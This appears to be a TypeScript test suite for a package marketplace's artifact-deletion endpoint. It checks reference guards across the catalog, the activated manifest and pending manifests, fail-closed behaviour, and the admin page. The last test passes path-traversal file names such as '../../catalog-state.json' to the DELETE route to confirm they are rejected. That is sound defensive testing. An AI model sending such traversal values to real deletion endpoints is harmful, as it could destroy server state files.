
  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  async function publish(name: string, version: string): Promise<{ id: string; tarball: string }> {
    const result = await publishTgz(market.baseUrl, 'test-admin-token', cleanPackageManifest({ name, version }))
    expect(result.status, JSON.stringify(result.body)).toBe(201)
    return (result.body as { entry: { id: string; tarball: string } }).entry
  }

  async function unpublish(id: string): Promise<void> {
    const response = await fetch(`${market.baseUrl}/v1/admin/entries/${encodeURIComponent(id)}/unpublish`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(response.status).toBe(200)
  }

  /** The two-step release: prepare -> offline sign -> verified intake/activate. */
  async function release(): Promise<void> {
    const prepared = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepared.status).toBe(200)
    const { pendingManifest } = await prepared.json() as { pendingManifest: unknown }
    const record = signManifest(pendingManifest as MarketManifest, {
      privateKeyPem: market.key.privateKeyPem,
      slot: 1,
      signedAt: new Date().toISOString(),
    })
    const intake = await fetch(`${market.baseUrl}/v1/admin/manifest/signature`, {
      method: 'POST',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify(record),
    })
    expect(intake.status).toBe(200)
  }

  async function deleteArtifact(fileName: string): Promise<Response> {
    return fetch(`${market.baseUrl}/v1/admin/artifact?file=${encodeURIComponent(fileName)}`, {
      method: 'DELETE',
      headers: adminHeaders('test-admin-token'),
    })
  }

  interface ArtifactView {
    readonly fileName: string
    readonly size: number
    readonly deletable: boolean
    readonly referencedBy: string | null
  }

  async function artifactState(): Promise<readonly ArtifactView[]> {
    const response = await fetch(`${market.baseUrl}/v1/admin/state`, { headers: adminHeaders('test-admin-token') })
    expect(response.status).toBe(200)
    return ((await response.json()) as { artifacts: readonly ArtifactView[] }).artifacts
  }

  it('refuses to delete an artifact a catalog entry still references (D2 root cause)', async () => {
    const entry = await publish('@huaanwork/keep-me', '1.0.0')

    const response = await deleteArtifact(entry.tarball)
    expect(response.status).toBe(409)
    const parsed = await response.json() as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('artifact-referenced')
    // Honest copy: WHICH face references it, and what the operator does next.
    expect(parsed.error.message).toContain(entry.id)
    expect(parsed.error.message).toContain('unpublish')

    // Nothing was deleted: still on disk, still downloadable.
    expect(await market.artifacts.stat(entry.tarball)).not.toBeNull()
    expect((await fetch(`${market.baseUrl}/artifacts/${entry.tarball}`)).status).toBe(200)
  })

  it('refuses to delete after unpublish while the activated manifest still references it', async () => {
    const entry = await publish('@huaanwork/still-signed', '1.0.0')
    await release()
    await unpublish(entry.id)

    // The activated manifest still names the artifact, so clients can still
    // download and install it (an entries-only check would delete live bytes).
    const manifest = await (await fetch(`${market.baseUrl}/v1/manifest`)).json() as { files: Array<{ tarballPath: string }> }
    expect(manifest.files.map(file => file.tarballPath)).toContain(`/artifacts/${entry.tarball}`)

    const response = await deleteArtifact(entry.tarball)
    expect(response.status).toBe(409)
    const parsed = await response.json() as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('artifact-referenced')
    expect(parsed.error.message).toContain('已激活清单')
    expect(parsed.error.message).toContain('重新 prepare')
    expect(await market.artifacts.stat(entry.tarball)).not.toBeNull()
  })

  it('replays the activated manifest and its signature byte-for-byte across an unpublish (M10)', async () => {
    // 既有 :869-886 只比 files[].tarballPath;本条比**整份文档**——信封(revision/
    // issuedAt/notAfter/domain)与签名记录都不得因一次 unpublish 而变动。这是
    // 「紧急下架的唯一生效路径是重新 prepare + 离线签 + intake」的可机械验证形式:
    // 任何让服务端自动重建/重签的改动都会让本条变红。
    const entry = await publish('@huaanwork/takedown-probe', '1.0.0')
    await release()

    const manifestBefore = await (await fetch(`${market.baseUrl}/v1/manifest`)).text()
    const signatureBefore = await (await fetch(`${market.baseUrl}/v1/manifest/signature`)).text()

    await unpublish(entry.id)

    const manifestAfter = await (await fetch(`${market.baseUrl}/v1/manifest`)).text()
    const signatureAfter = await (await fetch(`${market.baseUrl}/v1/manifest/signature`)).text()

    expect(manifestAfter).toBe(manifestBefore)
    expect(signatureAfter).toBe(signatureBefore)
    // 且下架对客户端安装路径**零影响**:字节仍可下载(这正是需要 SOP 的原因)。
    expect((await fetch(`${market.baseUrl}/artifacts/${entry.tarball}`)).status).toBe(200)
  })

  // 评审 Important 1（修复轮 1）：第三面 —— **已 prepare 但未激活**的待签清单。
  // 确定性运营者可复现序列（无竞态）：publish A → prepare（pending=[A]）→ unpublish A
  // → 此刻目录面已清、已激活清单为空，唯独 pending 槽仍逐字持有指向 X 的清单。
  // 旧双面判据在此判 204（管理页也把 X 标成可删）——而该 pending 的签名仍然有效，
  // 运营者随后 activate 成功，/v1/manifest 便回放 /artifacts/X，客户端下载即失败。
  // 第三面把这个窗口关死在删除端点（激活路径不动）。
  it('refuses to delete while a prepared (not yet activated) pending manifest references it', async () => {
    const entry = await publish('@huaanwork/prepared-only', '1.0.0')
    // prepare 而不签名：待签清单留在 pending 槽（本用例不激活它）。
    const prepared = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepared.status).toBe(200)
    await unpublish(entry.id)

    // 目录面与已激活清单面都已清空 —— 这正是旧双面判据会放行的状态。
    expect(market.store.manifest()).toBeNull()
    const response = await deleteArtifact(entry.tarball)
    expect(response.status).toBe(409)
    const parsed = await response.json() as { error: { code: string; message: string } }
    expect(parsed.error.code).toBe('artifact-referenced')
    // 诚实文案：点名 pending 面 + 下一步。
    expect(parsed.error.message).toContain('待激活清单')
    expect(parsed.error.message).toContain('重新 prepare')

    // 制品仍在盘上、仍可下载（pending 可被原样签名激活，字节必须保住）。
    expect(await market.artifacts.stat(entry.tarball)).not.toBeNull()
    expect((await fetch(`${market.baseUrl}/artifacts/${entry.tarball}`)).status).toBe(200)
    // 管理页与端点同一判据：X 标为被引用（不可删除）。
    const view = (await artifactState()).find(artifact => artifact.fileName === entry.tarball)
    expect(view).toMatchObject({ deletable: false, referencedBy: 'pending' })
  })

  it('deletes it once the pending manifest is resolved without the artifact', async () => {
    const entry = await publish('@huaanwork/pending-resolved', '1.0.0')
    const prepared = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('test-admin-token'),
    })
    expect(prepared.status).toBe(200)
    await unpublish(entry.id)
    expect((await deleteArtifact(entry.tarball)).status).toBe(409)

    // 解决 pending：重新 prepare（目录已空 ⇒ files 为空）并激活它。
    await release()
    const response = await deleteArtifact(entry.tarball)
    expect(response.status).toBe(204)
    expect(await market.artifacts.stat(entry.tarball)).toBeNull()
  })

  it('fails closed when the prepared-but-unactivated pending manifest cannot be inspected', async () => {
    const entry = await publish('@huaanwork/pending-shape', '1.0.0')
    // 运营者手改状态文件 / 从旧备份还原：pending 槽的 files[] 不可解析。
    // 无法**证明**未被引用 ⇒ 与已激活清单同款 fail-closed，拒绝删除。
    await market.store.setPendingManifest({ envelope: { revision: 1 } })
    await unpublish(entry.id)

    const response = await deleteArtifact(entry.tarball)
    expect(response.status).toBe(409)
    expect(((await response.json()) as { error: { code: string } }).error.code).toBe('artifact-referenced')
    expect(await market.artifacts.stat(entry.tarball)).not.toBeNull()
  })

  it('deletes an artifact once neither the entries nor the activated manifest reference it', async () => {
    const kept = await publish('@huaanwork/kept', '1.0.0')
    const doomed = await publish('@huaanwork/remove-me', '1.0.0')
    await release()
    await unpublish(doomed.id)
    await release() // re-prepare + activate a manifest WITHOUT the entry

    const response = await deleteArtifact(doomed.tarball)
    expect(response.status).toBe(204)
    expect(await market.artifacts.stat(doomed.tarball)).toBeNull()
    expect((await fetch(`${market.baseUrl}/artifacts/${doomed.tarball}`)).status).toBe(404)
    // The artifact still referenced by both faces is untouched.
    expect(await market.artifacts.stat(kept.tarball)).not.toBeNull()
  })

  it('lists deletable artifacts separately from referenced ones in the admin page', async () => {
    const kept = await publish('@huaanwork/kept', '1.0.0')
    await release() // activated manifest = [kept]
    const manifestOnly = await publish('@huaanwork/manifest-only', '1.0.0')
    await release() // activated manifest = [kept, manifest-only]
    await unpublish(manifestOnly.id) // catalog face clear, manifest face still names it
    const orphan = await publish('@huaanwork/orphan', '1.0.0')
    await unpublish(orphan.id) // never entered an activated manifest

    const byName = new Map((await artifactState()).map(artifact => [artifact.fileName, artifact]))
    expect(byName.get(kept.tarball)).toMatchObject({ deletable: false, referencedBy: 'catalog' })
    expect(byName.get(manifestOnly.tarball)).toMatchObject({ deletable: false, referencedBy: 'manifest' })
    expect(byName.get(orphan.tarball)).toMatchObject({ deletable: true, referencedBy: null })

    const html = await (await fetch(`${market.baseUrl}/admin`)).text()
    // Two separate lists: deletable artifacts, and referenced (undeletable) ones.
    expect(html).toContain('id="artifactsDeletable"')
    expect(html).toContain('id="artifactsReferenced"')
    // Referenced rows never get a clickable delete button (the P26 IMMUTABLE
    // grey-out idea): the button receives an onclick only in the deletable
    // branch, the other branch renders it disabled with the face named.
    expect(html).toContain('if (artifact.deletable)')
    expect(html).toContain('remove.disabled = true')
  })

  it('reports disk reclaimed so the operator can see the effect', async () => {
    const kept = await publish('@huaanwork/size-kept', '1.0.0')
    const doomed = await publish('@huaanwork/size-doomed', '1.0.0')
    await release()
    await unpublish(doomed.id)
    await release()
    const size = (await market.artifacts.stat(doomed.tarball))?.size
    expect(size).toBeGreaterThan(0)

    const response = await deleteArtifact(doomed.tarball)
    expect(response.status).toBe(204)
    // 204 carries no body by design, so the reclaimed byte count travels in a header.
    expect(response.headers.get('x-artifact-bytes-reclaimed')).toBe(String(size))
    expect(await market.artifacts.stat(doomed.tarball)).toBeNull()
    expect((await artifactState()).map(artifact => artifact.fileName)).not.toContain(doomed.tarball)
    expect(await market.artifacts.stat(kept.tarball)).not.toBeNull()
  })

  it('fails closed when the activated manifest shape cannot be inspected', async () => {
    const entry = await publish('@huaanwork/shape', '1.0.0')
    // Seed an activated manifest with no inspectable files[] (reachable by an
    // operator hand-editing the state file or restoring an old backup; the
    // signature pins the bytes, not the document shape). We cannot prove the
    // artifact is unreferenced, so deletion must refuse rather than guess.
    await market.store.activate({ envelope: { revision: 1 } }, null, 1)
    await unpublish(entry.id)

    const response = await deleteArtifact(entry.tarball)
    expect(response.status).toBe(409)
    expect(((await response.json()) as { error: { code: string } }).error.code).toBe('manifest-unreadable')
    expect(await market.artifacts.stat(entry.tarball)).not.toBeNull()
  })

  it('rejects a missing or unsafe artifact name without touching the data directory', async () => {
    // A publish writes the state document, so the traversal target exists on disk.
    const entry = await publish('@huaanwork/name-guard', '1.0.0')
    const stateFile = join(market.dataDir, 'catalog-state.json')
    await expect(stat(stateFile)).resolves.toBeDefined()

    const missing = await fetch(`${market.baseUrl}/v1/admin/artifact`, {
      method: 'DELETE',
      headers: adminHeaders('test-admin-token'),
    })
    expect(missing.status).toBe(400)
    expect(((await missing.json()) as { error: { code: string } }).error.code).toBe('invalid-delete-request')

    // The deletion route answers only DELETE.
    const wrongMethod = await fetch(`${market.baseUrl}/v1/admin/artifact?file=x.tgz`, {
      method: 'GET',
      headers: adminHeaders('test-admin-token'),
    })
    expect(wrongMethod.status).toBe(405)

    // The name is joined into the artifacts directory before unlink(); a
    // traversal segment must never reach the filesystem.
    for (const unsafe of ['../../catalog-state.json', '../server.lock', 'catalog-state.json', '.upload-1-1.tmp']) {
      const response = await deleteArtifact(unsafe)
      expect(response.status, unsafe).toBe(404)
      expect(((await response.json()) as { error: { code: string } }).error.code, unsafe).toBe('artifact-not-found')
    }
    await expect(stat(stateFile)).resolves.toBeDefined()
    await expect(stat(join(market.dataDir, 'server.lock'))).resolves.toBeDefined()
    expect(await market.artifacts.stat(entry.tarball)).not.toBeNull()
  })
})
